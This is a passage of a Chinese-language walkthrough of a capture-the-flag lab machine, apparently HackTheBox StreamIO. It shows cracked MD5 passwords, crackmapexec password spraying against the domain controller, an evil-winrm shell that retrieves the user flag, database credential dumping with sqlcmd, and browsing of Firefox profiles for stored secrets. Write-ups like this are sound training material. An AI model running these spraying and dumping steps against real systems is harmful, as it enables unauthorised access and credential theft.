<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c">nikk37<br> <span class="hljs-number">389</span>d14cb8e4e9b94b137deb1caf0612a<br>yoshihide<br> b779ba15cedfd22a023c4d8bcf5f2332<br>James<br> c660060492d9edcaa8332d89c99c9239<br>Theodore<br> <span class="hljs-number">925e5408</span>ecb67aea449373d668b7359e<br>Samantha<br> <span class="hljs-number">083f</span>fae904143c4796e464dac33c1f7d<br>Lauren<br> <span class="hljs-number">08344b</span>85b329d7efd611b7a7743e8a09<br>William<br> d62be0dc82071bccc1322d64ec5b6c51<br>Sabrina<br> f87d3c0d6c8fd686aacc6627f1f493a5<br><br>nikk37<br>yoshihide<br>James<br>Theodore<br>Samantha<br>Lauren<br>William<br>Sabrina<br><br><span class="hljs-number">389</span>d14cb8e4e9b94b137deb1caf0612a<br>b779ba15cedfd22a023c4d8bcf5f2332<br>c660060492d9edcaa8332d89c99c9239<br><span class="hljs-number">925e5408</span>ecb67aea449373d668b7359e<br><span class="hljs-number">083f</span>fae904143c4796e464dac33c1f7d<br><span class="hljs-number">08344b</span>85b329d7efd611b7a7743e8a09<br>d62be0dc82071bccc1322d64ec5b6c51<br>f87d3c0d6c8fd686aacc6627f1f493a5<br><br>-------------------  下面是解密的结果<br>  <br><span class="hljs-number">389</span>d14cb8e4e9b94b137deb1caf0612a    md5 get_dem_girls2@yahoo.com<br>b779ba15cedfd22a023c4d8bcf5f2332    md5 <span class="hljs-number">66b</span>oysandgirls..<br>c660060492d9edcaa8332d89c99c9239    Unknown Not found.<br><span class="hljs-number">925e5408</span>ecb67aea449373d668b7359e    Unknown Not found.<br><span class="hljs-number">083f</span>fae904143c4796e464dac33c1f7d    Unknown Not found.<br><span class="hljs-number">08344b</span>85b329d7efd611b7a7743e8a09    md5 ##<span class="hljs-number">123</span>a8j8w5123##<br>d62be0dc82071bccc1322d64ec5b6c51    Unknown Not found.<br>f87d3c0d6c8fd686aacc6627f1f493a5    md5 !!sabrina$<br></code></pre></td></tr></table></figure>

<p>25、这里获取的用户和主机上存在的用户很相似，这里使用crackmapexec 工具或者 evil-winrm 工具尝试验活下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ crackmapexec smb <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span> -u users.txt -p password.txt --<span class="hljs-keyword">continue</span>-on-success                                                       <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [*] Windows <span class="hljs-number">10.0</span> Build <span class="hljs-number">17763</span> x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)<br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [+] streamIO.htb\nikk37:get_dem_girls2@yahoo.com <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [-] streamIO.htb\nikk37:<span class="hljs-number">66b</span>oysandgirls.. STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [-] streamIO.htb\nikk37:##<span class="hljs-number">123</span>a8j8w5123## STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [-] streamIO.htb\nikk37:!!sabrina$ STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [-] streamIO.htb\yoshihide:get_dem_girls2@yahoo.com STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [-] streamIO.htb\yoshihide:<span class="hljs-number">66b</span>oysandgirls.. STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [-] streamIO.htb\yoshihide:##<span class="hljs-number">123</span>a8j8w5123## STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [-] streamIO.htb\yoshihide:!!sabrina$ STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [-] streamIO.htb\James:get_dem_girls2@yahoo.com STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [-] streamIO.htb\James:<span class="hljs-number">66b</span>oysandgirls.. STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [-] streamIO.htb\James:##<span class="hljs-number">123</span>a8j8w5123## STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [-] streamIO.htb\James:!!sabrina$ STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [-] streamIO.htb\Theodore:get_dem_girls2@yahoo.com STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [-] streamIO.htb\Theodore:<span class="hljs-number">66b</span>oysandgirls.. STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [-] streamIO.htb\Theodore:##<span class="hljs-number">123</span>a8j8w5123## STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [-] streamIO.htb\Theodore:!!sabrina$ STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [-] streamIO.htb\Samantha:get_dem_girls2@yahoo.com STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [-] streamIO.htb\Samantha:<span class="hljs-number">66b</span>oysandgirls.. STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [-] streamIO.htb\Samantha:##<span class="hljs-number">123</span>a8j8w5123## STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [-] streamIO.htb\Samantha:!!sabrina$ STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [-] streamIO.htb\Lauren:get_dem_girls2@yahoo.com STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [-] streamIO.htb\Lauren:<span class="hljs-number">66b</span>oysandgirls.. STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [-] streamIO.htb\Lauren:##<span class="hljs-number">123</span>a8j8w5123## STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [-] streamIO.htb\Lauren:!!sabrina$ STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [-] streamIO.htb\William:get_dem_girls2@yahoo.com STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [-] streamIO.htb\William:<span class="hljs-number">66b</span>oysandgirls.. STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [-] streamIO.htb\William:##<span class="hljs-number">123</span>a8j8w5123## STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [-] streamIO.htb\William:!!sabrina$ STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [-] streamIO.htb\Sabrina:get_dem_girls2@yahoo.com STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [-] streamIO.htb\Sabrina:<span class="hljs-number">66b</span>oysandgirls.. STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [-] streamIO.htb\Sabrina:##<span class="hljs-number">123</span>a8j8w5123## STATUS_LOGON_FAILURE <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span>    <span class="hljs-number">445</span>    DC               [-] streamIO.htb\Sabrina:!!sabrina$ STATUS_LOGON_FAILURE <br></code></pre></td></tr></table></figure>

<p>26、然后使用可以登录的账号密码进行登录，并获取到第一个flag信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ evil-winrm -i <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span> -u nikk37 -p <span class="hljs-string">&#x27;get_dem_girls2@yahoo.com&#x27;</span><br>                                        <br>Evil-WinRM shell v3<span class="hljs-number">.5</span><br>                                        <br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine<br>                                        <br>Data: For more information, check Evil-WinRM GitHub: https:<span class="hljs-comment">//github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br>                                        <br>Info: Establishing connection to remote endpoint<br>*Evil-WinRM* PS C:\Users\nikk37\Documents&gt; whoami<br>streamio\nikk37<br>*Evil-WinRM* PS C:\Users\nikk37\Documents&gt; cd ../Desktop<br>*Evil-WinRM* PS C:\Users\nikk37\Desktop&gt; dir<br><br><br>    Directory: C:\Users\nikk37\Desktop<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>-ar---        <span class="hljs-number">4</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2024</span>   <span class="hljs-number">3</span>:<span class="hljs-number">44</span> PM             <span class="hljs-number">34</span> user.txt<br><br><br>*Evil-WinRM* PS C:\Users\nikk37\Desktop&gt; type user.txt<br>fc07dae5ff5336e78edeb6f239fea3c1<br>*Evil-WinRM* PS C:\Users\nikk37\Desktop&gt; <br></code></pre></td></tr></table></figure>

<p>补充：这里放置个演练报告里的方法，他是通过本地查看的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs c">PS C:\&gt; where.exe sqlcmd<br>C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\<span class="hljs-number">170</span>\Tools\Binn\SQLCMD.EXE<br><br>我无法与 shell 交互地使用它，但我可以使用一些命令行参数在命令行中每次调用时发出单个命令：<br><br>-S localhost- 要连接的主机<br>-U db_admin- 要连接的用户<br>-P B1@hx31234567890- 用户的密码<br>-d streamio_backup- 要使用的数据库<br>-Q [query]- 查询运行然后退出<br>有两个与主数据库相同的表：<br><br>PS C:\&gt; sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q <span class="hljs-string">&quot;select table_name from streamio_backup.information_schema.tables;&quot;</span><br>table_name<br>--------------------------------------------------------------------------------------------------------------------------------<br>movies<br><span class="hljs-title function_">users</span><br><br><span class="hljs-params">(<span class="hljs-number">2</span> rows affected)</span><br><br>PS C:\&gt; sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q &quot;select * from users;<span class="hljs-string">&quot;</span><br><span class="hljs-string">sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q &quot;</span>select * from users;<span class="hljs-string">&quot;</span><br><span class="hljs-string">id          username                                           password                                          </span><br><span class="hljs-string">----------- -------------------------------------------------- --------------------------------------------------</span><br><span class="hljs-string">          1 nikk37                                             389d14cb8e4e9b94b137deb1caf0612a                  </span><br><span class="hljs-string">          2 yoshihide                                          b779ba15cedfd22a023c4d8bcf5f2332                  </span><br><span class="hljs-string">          3 James                                              c660060492d9edcaa8332d89c99c9239                  </span><br><span class="hljs-string">          4 Theodore                                           925e5408ecb67aea449373d668b7359e                  </span><br><span class="hljs-string">          5 Samantha                                           083ffae904143c4796e464dac33c1f7d                  </span><br><span class="hljs-string">          6 Lauren                                             08344b85b329d7efd611b7a7743e8a09                  </span><br><span class="hljs-string">          7 William                                            d62be0dc82071bccc1322d64ec5b6c51                  </span><br><span class="hljs-string">          8 Sabrina                                            f87d3c0d6c8fd686aacc6627f1f493a5                  </span><br><span class="hljs-string"></span><br><span class="hljs-string">(8 rows affected)</span><br><span class="hljs-string"></span><br><span class="hljs-string">---------------------------------------------------------------</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">这里是补充了一下，使用本地的工具进行数据库的查找的过程，而不需要进行端口短发，再使用本地的工具进行登录使用</span><br><span class="hljs-string"></span><br><span class="hljs-string">┌──(kali㉿offsec)-[~/Desktop]</span><br><span class="hljs-string">└─$ evil-winrm -i 10.10.11.158 -u nikk37 -p &#x27;get_dem_girls2@yahoo.com&#x27;</span><br><span class="hljs-string">                                        </span><br><span class="hljs-string">Evil-WinRM shell v3.5</span><br><span class="hljs-string">                                        </span><br><span class="hljs-string">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine</span><br><span class="hljs-string">                                        </span><br><span class="hljs-string">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="hljs-string">                                        </span><br><span class="hljs-string">Info: Establishing connection to remote endpoint</span><br><span class="hljs-string">*Evil-WinRM* PS C:\Users\nikk37\Documents&gt; cd C:/</span><br><span class="hljs-string">*Evil-WinRM* PS C:\&gt; where.exe sqlcmd</span><br><span class="hljs-string">C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\SQLCMD.EXE</span><br><span class="hljs-string">*Evil-WinRM* PS C:\&gt; sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q &quot;</span>select table_name from streamio_backup.information_schema.tables;<span class="hljs-string">&quot;</span><br><span class="hljs-string">table_name</span><br><span class="hljs-string">--------------------------------------------------------------------------------------------------------------------------------</span><br><span class="hljs-string">movies</span><br><span class="hljs-string">users</span><br><span class="hljs-string"></span><br><span class="hljs-string">(2 rows affected)</span><br><span class="hljs-string">*Evil-WinRM* PS C:\&gt; sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q &quot;</span>select * from users;<span class="hljs-string">&quot;</span><br><span class="hljs-string">id          username                                           password</span><br><span class="hljs-string">----------- -------------------------------------------------- --------------------------------------------------</span><br><span class="hljs-string">          1 nikk37                                             389d14cb8e4e9b94b137deb1caf0612a</span><br><span class="hljs-string">          2 yoshihide                                          b779ba15cedfd22a023c4d8bcf5f2332</span><br><span class="hljs-string">          3 James                                              c660060492d9edcaa8332d89c99c9239</span><br><span class="hljs-string">          4 Theodore                                           925e5408ecb67aea449373d668b7359e</span><br><span class="hljs-string">          5 Samantha                                           083ffae904143c4796e464dac33c1f7d</span><br><span class="hljs-string">          6 Lauren                                             08344b85b329d7efd611b7a7743e8a09</span><br><span class="hljs-string">          7 William                                            d62be0dc82071bccc1322d64ec5b6c51</span><br><span class="hljs-string">          8 Sabrina                                            f87d3c0d6c8fd686aacc6627f1f493a5</span><br><span class="hljs-string"></span><br><span class="hljs-string">(8 rows affected)</span><br><span class="hljs-string">*Evil-WinRM* PS C:\&gt; </span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>

<h4 id="0x02-系统权限获取"><a href="#0x02-系统权限获取" class="headerlink" title="0x02 系统权限获取"></a>0x02 系统权限获取</h4><p>27、提升了到了用户级别的权限，就开始继续枚举信息了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ evil-winrm -i <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.158</span> -u nikk37 -p <span class="hljs-string">&#x27;get_dem_girls2@yahoo.com&#x27;</span><br>                                        <br>Evil-WinRM shell v3<span class="hljs-number">.5</span><br>                                        <br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine<br>                                        <br>Data: For more information, check Evil-WinRM GitHub: https:<span class="hljs-comment">//github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br>                                        <br>Info: Establishing connection to remote endpoint<br>*Evil-WinRM* PS C:\Users\nikk37\Documents&gt; dir C:\<span class="hljs-string">&quot;program files (x86)&quot;</span>\<br><br><br>    Directory: C:\program <span class="hljs-title function_">files</span> <span class="hljs-params">(x86)</span><br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>d-----        9/15/2018  12:28 AM                Common Files<br>d-----        2/25/2022  11:35 PM                IIS<br>d-----        2/25/2022  11:38 PM                iis express<br>d-----        3/28/2022   4:46 PM                Internet Explorer<br>d-----        2/22/2022   1:54 AM                Microsoft SQL Server<br>d-----        2/22/2022   1:53 AM                Microsoft.NET<br>d-----        5/26/2022   4:09 PM                Mozilla Firefox<br>d-----        5/26/2022   4:09 PM                Mozilla Maintenance Service<br>d-----        2/25/2022  11:33 PM                PHP<br>d-----        2/22/2022   2:56 AM                Reference Assemblies<br>d-----        3/28/2022   4:46 PM                Windows Defender<br>d-----        3/28/2022   4:46 PM                Windows Mail<br>d-----        3/28/2022   4:46 PM                Windows Media Player<br>d-----        9/15/2018  12:19 AM                Windows Multimedia Platform<br>d-----        9/15/2018  12:28 AM                windows nt<br>d-----        3/28/2022   4:46 PM                Windows Photo Viewer<br>d-----        9/15/2018  12:19 AM                Windows Portable Devices<br>d-----        9/15/2018  12:19 AM                WindowsPowerShell<br><br><br>*Evil-WinRM* PS C:\Users\nikk37\Documents&gt; cd C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\<br>*Evil-WinRM* PS C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles&gt; dir<br><br><br>    Directory: C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>d-----        2/22/2022   2:40 AM                5rwivk2l.<span class="hljs-keyword">default</span><br>d-----        2/22/2022   2:42 AM                br53rxeg.<span class="hljs-keyword">default</span>-release<br><br><br>*Evil-WinRM* PS C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles&gt; cd 5rwivk2l.<span class="hljs-keyword">default</span><br>*Evil-WinRM* PS C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\5rwivk2l.<span class="hljs-keyword">default</span>&gt; dir<br><br><br>    Directory: C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\5rwivk2l.<span class="hljs-keyword">default</span><br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>-a----        2/22/2022   2:40 AM             47 times.json<br><br><br>*Evil-WinRM* PS C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\5rwivk2l.<span class="hljs-keyword">default</span>&gt; type times.json<br>&#123;<br><span class="hljs-string">&quot;created&quot;</span>: <span class="hljs-number">1645526416905</span>,<br><span class="hljs-string">&quot;firstUse&quot;</span>: null<br>&#125;<br>*Evil-WinRM* PS C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\<span class="hljs-number">5</span>rwivk2l.<span class="hljs-keyword">default</span>&gt; cd ../br53rxeg.<span class="hljs-keyword">default</span>-release<br>*Evil-WinRM* PS C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.<span class="hljs-keyword">default</span>-release&gt; dir<br><br><br>    Directory: C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles\br53rxeg.<span class="hljs-keyword">default</span>-release<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>d-----        <span class="hljs-number">2</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">40</span> AM                bookmarkbackups<br>d-----        <span class="hljs-number">2</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">40</span> AM                browser-extension-data<br>d-----        <span class="hljs-number">2</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">41</span> AM                crashes<br>d-----        <span class="hljs-number">2</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">42</span> AM                datareporting<br>d-----        <span class="hljs-number">2</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">40</span> AM                minidumps<br>d-----        <span class="hljs-number">2</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">42</span> AM                saved-telemetry-pings<br>d-----        <span class="hljs-number">2</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">40</span> AM                security_state<br>d-----        <span class="hljs-number">2</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span 